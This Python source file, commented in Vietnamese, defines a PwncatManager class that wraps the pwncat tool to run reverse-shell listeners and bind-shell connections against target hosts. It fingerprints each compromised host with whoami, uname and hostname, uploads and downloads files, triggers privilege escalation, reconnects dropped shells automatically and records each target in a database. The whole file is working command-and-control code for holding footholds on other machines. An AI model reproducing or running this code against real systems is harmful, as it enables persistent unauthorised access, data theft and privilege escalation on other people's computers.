import subprocess
import threading
import time
from datetime import datetime
import socket
from urllib.parse import urlparse

# Thêm import cho lưu DB
try:
    from apps.models import Targets, db
except ImportError:
    Targets = None
    db = None

class PwncatManager:
    def __init__(self):
        self.shells = {}  # {shell_id: shell_info_dict}
        self.lock = threading.Lock()
        self.counter = 0
        self.reconnect_interval = 10  # giây
        self._auto_reconnect_thread = threading.Thread(target=self.auto_reconnect_shells, daemon=True)
        self._auto_reconnect_thread.start()

    def _generate_shell_id(self, prefix="shell"):
        with self.lock:
            self.counter += 1
            return f"{prefix}_{self.counter}_{int(time.time())}"

    def normalize_ip(self, target):
        # Nếu là IP, trả về luôn
        try:
            socket.inet_aton(target)
            return target
        except socket.error:
            pass
        # Nếu là URL, parse lấy hostname
        if target.startswith('http://') or target.startswith('https://'):
            hostname = urlparse(target).hostname
        else:
            hostname = target
        try:
            ip = socket.gethostbyname(hostname)
            return ip
        except Exception:
            return None

    def start_listener(self, port, name=None, url=None):
        proc = subprocess.Popen(
            ["python", "-m", "pwncat", "-lp", str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True
        )
        shell_id = name or self._generate_shell_id("listener")
        connect_time = datetime.utcnow().isoformat()
        info = {
            "id": shell_id,
            "proc": proc,
            "type": "listener",
            "port": port,
            "ip": None,
            "hostname": None,
            "url": url,
            "connect_time": connect_time,
            "disconnect_time": None,
            "last_active": connect_time,
            "status": "listening",
            "shell_type": "reverse",
            "reconnect_count": 0,
            "last_status": "active"
        }
        with self.lock:
            self.shells[shell_id] = info
        print(f"[+] Started pwncat listener on port {port} as '{shell_id}'")
        # Lưu vào DB
        self.save_shell_to_db(info)
        return shell_id

    def connect_shell(self, target, target_port, name=None, url=None):
        ip = self.normalize_ip(target)
        if not ip:
            print(f"[!] Could not resolve IP for target: {target}")
            return None
        proc = subprocess.Popen(
            ["python", "-m", "pwncat", ip, str(target_port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True
        )
        shell_id = name or self._generate_shell_id()
        connect_time = datetime.utcnow().isoformat()
        info = {
            "id": shell_id,
            "proc": proc,
            "type": "connect",
            "ip": ip,
            "hostname": target,
            "url": url,
            "port": target_port,
            "connect_time": connect_time,
            "disconnect_time": None,
            "last_active": connect_time,
            "status": "connected",
            "shell_type": "bind",
            "reconnect_count": 0,
            "last_status": "active"
        }
        with self.lock:
            self.shells[shell_id] = info
        print(f"[+] Connected to shell at {ip}:{target_port} as '{shell_id}'")
        # Lấy user, os, hostname
        self._update_shell_info(shell_id)
        # Lưu vào DB
        self.save_shell_to_db(info)
        return shell_id

    def _update_shell_info(self, shell_id):
        info = self.shells.get(shell_id)
        if not info:
            return
        user = self.send_command(shell_id, "whoami")
        osinfo = self.send_command(shell_id, "uname -a")
        hostname = self.send_command(shell_id, "hostname")
        info["user"] = user.strip() if user else None
        info["os"] = osinfo.strip() if osinfo else None
        info["hostname"] = hostname.strip() if hostname else info.get("hostname")
        # Update DB
        self.save_shell_to_db(info)

    def close_shell(self, shell_id):
        with self.lock:
            info = self.shells.get(shell_id)
            if info:
                proc = info["proc"]
                proc.terminate()
                proc.wait()
                info["disconnect_time"] = datetime.utcnow().isoformat()
                info["last_status"] = "closed"
                self.save_shell_to_db(info)
                del self.shells[shell_id]
                print(f"[-] Closed shell '{shell_id}'")
                return True
            else:
                print(f"[!] Shell '{shell_id}' not found.")
                return False

    def list_shells(self):
        with self.lock:
            return list(self.shells.keys())

    def get_all_shells_info(self):
        with self.lock:
            return [self._shell_info_dict(sid) for sid in self.shells]

    def _shell_info_dict(self, shell_id):
        info = self.shells.get(shell_id)
        if not info:
            return None
        return {
            "id": info["id"],
            "type": info["type"],
            "ip": info.get("ip"),
            "port": info.get("port"),
            "connect_time": info.get("connect_time"),
            "disconnect_time": info.get("disconnect_time"),
            "last_active": info.get("last_active"),
            "status": info.get("status"),
            "shell_type": info.get("shell_type"),
            "reconnect_count": info.get("reconnect_count", 0),
            "last_status": info.get("last_status"),
            "hostname": info.get("hostname"),
            "user": info.get("user"),
            "os": info.get("os"),
            "url": info.get("url"),
        }

    def get_shell_info(self, shell_id):
        info = self.shells.get(shell_id)
        if not info:
            return None
        self._update_shell_info(shell_id)
        base_info = self._shell_info_dict(shell_id) or {}
        return dict(base_info)

    def send_command(self, shell_id, command, timeout=3):
        info = self.shells.get(shell_id)
        if not info:
            print(f"[!] Shell '{shell_id}' not found.")
            return None
        proc = info["proc"]
        try:
            proc.stdin.write(command + "\n")
            proc.stdin.flush()
            return self.read_output(shell_id, timeout=timeout)
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            return None

    def read_output(self, shell_id, timeout=3):
        info = self.shells.get(shell_id)
        if not info:
            print(f"[!] Shell '{shell_id}' not found.")
            return None
        proc = info["proc"]
        output_lines = []
        start = time.time()
        while True:
            if proc.stdout.readable():
                line = proc.stdout.readline()
                if line:
                    output_lines.append(line)
                    info["last_active"] = datetime.utcnow().isoformat()
                else:
                    break
            if time.time() - start > timeout:
                break
        return "".join(output_lines)

    def upload_file(self, shell_id, local_path, remote_path):
        info = self.shells.get(shell_id)
        if not info:
            print(f"[!] Shell '{shell_id}' not found.")
            return False
        proc = info["proc"]
        try:
            proc.stdin.write(f"upload {local_path} {remote_path}\n")
            proc.stdin.flush()
            info["last_active"] = datetime.utcnow().isoformat()
            return True
        except Exception as e:
            print(f"[!] Error uploading file: {e}")
            return False

    def download_file(self, shell_id, remote_path, local_path):
        info = self.shells.get(shell_id)
        if not info:
            print(f"[!] Shell '{shell_id}' not found.")
            return False
        proc = info["proc"]
        try:
            proc.stdin.write(f"download {remote_path} {local_path}\n")
            proc.stdin.flush()
            info["last_active"] = datetime.utcnow().isoformat()
            return True
        except Exception as e:
            print(f"[!] Error downloading file: {e}")
            return False

    def escalate_privilege(self, shell_id, user=None):
        info = self.shells.get(shell_id)
        if not info:
            print(f"[!] Shell '{shell_id}' not found.")
            return False
        proc = info["proc"]
        try:
            if user:
                proc.stdin.write(f"escalate run -u {user}\n")
            else:
                proc.stdin.write("escalate run\n")
            proc.stdin.flush()
            info["last_active"] = datetime.utcnow().isoformat()
            return True
        except Exception as e:
            print(f"[!] Error escalating privilege: {e}")
            return False

    def check_shell_alive(self, shell_id):
        info = self.shells.get(shell_id)
        if not info:
            return False
        proc = info["proc"]
        alive = proc.poll() is None
        if not alive:
            info["last_status"] = "disconnected"
            info["disconnect_time"] = datetime.utcnow().isoformat()
            self.save_shell_to_db(info)
        return alive

    def auto_reconnect_shells(self):
        while True:
            time.sleep(self.reconnect_interval)
            with self.lock:
                for shell_id, info in list(self.shells.items()):
                    if not self.check_shell_alive(shell_id):
                        print(f"[!] Shell {shell_id} lost. Attempting to reconnect...")
                        # Chỉ tự động reconnect cho shell kiểu bind
                        if info.get("shell_type") == "bind" and info.get("ip") and info.get("port"):
                            info["reconnect_count"] += 1
                            info["last_status"] = "reconnecting"
                            self.save_shell_to_db(info)
                            try:
                                new_shell_id = self.connect_shell(info["ip"], info["port"], name=shell_id, url=info.get("url"))
                                print(f"[+] Reconnected shell {shell_id} as {new_shell_id}")
                            except Exception as e:
                                print(f"[!] Failed to reconnect shell {shell_id}: {e}")
                        # Nếu là reverse shell, có thể tự động mở lại listener nếu muốn
                        elif info.get("shell_type") == "reverse" and info.get("port"):
                            info["reconnect_count"] += 1
                            info["last_status"] = "re-listening"
                            self.save_shell_to_db(info)
                            try:
                                new_shell_id = self.start_listener(info["port"], name=shell_id, url=info.get("url"))
                                print(f"[+] Restarted listener for shell {shell_id} as {new_shell_id}")
                            except Exception as e:
                                print(f"[!] Failed to restart listener for shell {shell_id}: {e}")

    def save_shell_to_db(self, info):
        if not Targets or not db:
            return
        # Tìm target theo ip và hostname
        target = Targets.query.filter_by(ip_address=info.get("ip"), hostname=info.get("hostname")).first()
        if not target:
            # Tạo mới
            target = Targets(
                hostname=info.get("hostname") or info.get("ip"),
                ip_address=info.get("ip") or "",
                server_type=info.get("shell_type") or "unknown",
                os=info.get("os"),
                status=info.get("last_status") or "active",
                notes=f"ShellID: {info.get('id')}, User: {info.get('user')}, URL: {info.get('url')}, Reconnect: {info.get('reconnect_count')}, Last: {info.get('last_status')}"
            )
            db.session.add(target)
        else:
            # Update
            target.os = info.get("os")
            target.status = info.get("last_status") or target.status
            target.notes = f"ShellID: {info.get('id')}, User: {info.get('user')}, URL: {info.get('url')}, Reconnect: {info.get('reconnect_count')}, Last: {info.get('last_status')}"
        try:
            db.session.commit()
        except Exception as e:
            db.session.rollback()
            print(f"[!] Error saving shell info to DB: {e}")

# # Example usage:
# if __name__ == "__main__":
#     manager = PwncatManager()
#     shell1 = manager.start_listener(4444)
#     # shell2 = manager.connect_shell("example.com", 4444)
#     print(manager.get_all_shells_info())
#     # manager.send_command(shell1, "whoami")
#     # print(manager.read_output(shell1))
#     # manager.close_shell(shell1)
